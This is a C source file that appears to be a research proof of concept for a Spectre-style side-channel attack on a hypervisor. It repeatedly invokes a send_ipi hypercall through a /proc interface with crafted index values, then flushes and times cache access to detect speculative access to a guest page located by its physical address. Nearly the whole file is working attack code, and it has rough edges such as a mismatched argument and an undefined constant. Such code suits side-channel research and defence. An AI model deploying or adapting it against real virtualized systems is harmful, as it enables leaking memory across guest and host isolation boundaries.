#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "../../include/asm.h"
#include "../../include/flush_and_reload.h"
#include "hypercall.h"

#define LEAK_PAGE_SIZE (2097152) // 2MiB

int hypercall(struct send_ipi_hypercall_opts *opts) {
  const char *hypercall_path = "/proc/hypercall/send_ipi";
  int fd = open(hypercall_path, O_WRONLY);
  if (fd < 0) {
    err(fd, "Failed to open %s", hypercall_path);
  }

  int b = write(fd, opts, 2 * sizeof(*opts));
  close(fd);
  if (b < 0) {
    err(errno, "Failed to write to %s", hypercall_path);
  }
  return b;
}

size_t calculate_min(uintptr_t phys_page_addr, uintptr_t phys_map_addr) {
  // It is below the phys_map, and thus unreachable
  if (phys_page_addr < phys_map_addr) {
    return 0;
  }

  return (phys_page_addr - phys_map_addr) / 8;
}

const size_t upper_bound = 30000;
const size_t lower_bound = 28300;
void access_buffer_with_spectre(void *buf, size_t idx) {

  size_t before = 0, after = 0;

  struct send_ipi_hypercall_opts opts[2] = {0};
  opts[0].mask_low = -1;
  opts[0].min = 0;
  opts[1].mask_low = -1;

  const size_t iters = 10000;
  for (size_t i = 0; i < iters; ++i) {
    clflush(buf);
    opts[1].min = ~idx;
    hypercall(opts);
    before += access_time(buf);

    opts[1].min = idx;
    clflush(buf);
    hypercall(buf);
    after += access_time(buf);
  }
  printf("%d\tBefore: %ld\tAfter: %ld\n", before > after, before / iters,
         after / iters);
}

int main(int argc, char *argv[argc]) {
  void *leak_page =
      mmap(NULL, LEAK_PAGE_SIZE, PROT_READ | PROT_WRITE,
           MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | MAP_POPULATE, 0, 0);
  if (leak_page == (void *)-1) {
    err(errno, "mmap failed");
  }

  // Determine the physical address
  if (argc == 1) {
    *(uint64_t *)leak_page = page_value;
    getchar();
    *(uint64_t *)leak_page = 0;
  } else if (argc == 3) {
    // First, phys addr
    // Second phys map addr

    char *endptr = NULL;
    uintptr_t page_addr = strtoull(argv[1], &endptr, 16);
    if (endptr == argv[1]) {
      errx(EINVAL, "Could not parse phys addr of page");
    }

    uintptr_t phys_map_addr = strtoull(argv[2], &endptr, 16);
    if (endptr == argv[2]) {
      errx(EINVAL, "Could not parse phys addr of phys_map");
    }

    size_t min = calculate_min(page_addr, phys_map_addr);
    // printf("Min: %ld / %lx\n", min, min);
    access_buffer_with_spectre(leak_page, min);
  }

  munmap(leak_page, LEAK_PAGE_SIZE);
  return 0;

  // static const size_t PAGE_SIZE = 4096;
  //
  // void *buffer = aligned_alloc(PAGE_SIZE, PAGE_SIZE);
  // if (!buffer) {
  //   perror("Failed to allocate buffer");
  // }
  //
  // return 0;
}
